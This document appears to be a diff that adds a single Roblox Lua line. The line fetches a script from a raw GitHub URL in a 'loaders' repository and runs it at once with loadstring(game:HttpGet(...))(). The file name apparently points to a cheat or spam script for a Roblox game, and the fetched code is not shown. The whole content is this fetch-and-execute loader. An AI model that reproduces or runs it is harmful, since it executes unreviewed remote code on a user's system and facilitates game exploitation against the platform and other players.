@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/worldfront-spam7-2ihw0ky9n50w3b.lua"))()
